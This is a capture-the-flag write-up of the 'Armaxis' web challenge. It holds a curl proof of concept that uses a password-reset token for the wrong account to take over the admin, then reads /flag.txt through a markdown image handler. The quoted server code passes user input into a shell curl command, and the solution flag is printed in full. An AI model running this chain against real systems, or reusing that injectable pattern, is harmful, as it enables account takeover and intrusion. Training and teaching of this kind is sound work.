# Armaxis - Very Easy Web Challenge

## Challenge Overview
The Armaxis challenge involved exploiting an Insecure Direct Object Reference (IDOR) vulnerability in the password reset functionality combined with a Local File Inclusion (LFI) vulnerability in a custom markdown parser to retrieve the flag.

## Steps to Reproduce

### 1. Initial Reconnaisance
- The challenge had two services:
  - Armaxis armory app on port 31070 (Express app with JWT auth)
  - Mail inbox on port 31962 (for receiving password reset tokens)
- Registration and login functionality was available
- Password reset flow sent tokens to the mail inbox

### 2. IDOR in Password Reset
- When requesting a password reset for `test@email.htb`, a token was sent to the mail inbox
- The same token could be used to reset the password for `admin@armaxis.htb`
- The `/reset-password` endpoint validated the token but didn't check if it belonged to the provided email
- This allowed account takeover of the admin account

### 3. Gaining Admin Access
1. Request password reset for `test@email.htb`
2. Retrieve token from mail inbox at `http://154.57.164.78:31962/`
3. Use the same token to reset password for `admin@armaxis.htb`
4. Login as admin with the new password
5. Obtained JWT with `role: "admin"` and `id: 1`

### 4. LFI in Markdown Parser (Weapon Dispatch)
- As admin, could dispatch weapons via `/weapons/dispatch` endpoint
- The endpoint accepted `{name, price, note, dispatched_to}` parameters
- The `note` field was processed through a custom markdown parser
- The markdown parser used `markdown-it` with a custom image handler:
  ```javascript
  function parseMarkdown(content) {
    if (!content) return "";
    return md.render(
      content.replace(/\!\[.*?\]\((.*?)\)/g, (match, url) => {
        try {
          const fileContent = execSync(`curl -s ${url}`);
          const base64Content = Buffer.from(fileContent).toString("base64");
          return `<img src="data:image/*;base64,${base64Content}" alt="Embedded Image">`;
        } catch (err) {
          console.error(`Error fetching image from URL ${url}:`, err.message);
          return `<p>Error loading image: ${url}</p>`;
        }
      }),
    );
  }
  ```
- This allowed file inclusion via `![](file:///path)` syntax
- The server would `curl` the file and embed it as base64 in an `<img>` tag

### 5. Extracting the Flag
1. As admin, dispatched a weapon with note: `![](file:///flag.txt)`
2. The server fetched `/flag.txt` and embedded it as base64 in the weapon's note field
3. When viewing the weapons page, the base64-encoded flag was visible in the note column
4. Decoding the base64 revealed the flag: `HTB{m4rkd0wn_bugs_1n_th3_w1ld!}`

## Proof of Concept
```bash
# Get reset token for test@email.htb
curl -X POST http://154.57.164.78:31070/reset-password/request \
  -H "Content-Type: application/json" \
  -d '{"email": "test@email.htb"}'

# Retrieve token from mail inbox (http://154.57.164.78:31962/)
# Token format: e.g., d2d9fbb3873359a0ed9fcb545b656aec

# Use token to reset admin password
curl -X POST http://154.57.164.78:31070/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token": "TOKEN_FROM_MAIL", "newPassword": "admin123", "email": "admin@armaxis.htb"}'

# Login as admin
curl -X POST http://154.57.164.78:31070/login \
  -H "Content-Type: application/json" \
  -d '{"email": "admin@armaxis.htb", "password": "admin123"}'
# Get JWT token from response cookies

# Dispatch weapon with LFI
curl -X POST http://154.57.164.78:31070/weapons/dispatch \
  -H "Content-Type: application/json" \
  -b "token=JWT_FROM_LOGIN" \
  -d '{"name": "Exploit", "price": 1, "note": "![](file:///flag.txt)", "dispatched_to": "admin@armaxis.htb"}'

# View weapons page to see base64-encoded flag in note field
# Decode base64 to get flag: HTB{m4rkd0wn_bugs_1n_th3_w1ld!}
```

## Vulnerabilities Exploited
1. **IDOR (Insecure Direct Object Reference)** in password reset - CWE-639
   - Token validation lacked ownership verification
2. **LFI (Local File Inclusion)** via custom markdown parser - CWE-22
   - Unrestricted file access via `![](file:///)` syntax in markdown

## Files Created
- `writeup.md` - This file
- `solve.py` - Automated exploit script (optional)

## Lessons Learned
- Always validate that tokens belong to the intended user in password reset flows
- Sandbox or restrict file operations in markdown/image processing libraries
- Implement proper input validation and output encoding
- Follow principle of least privilege for file system access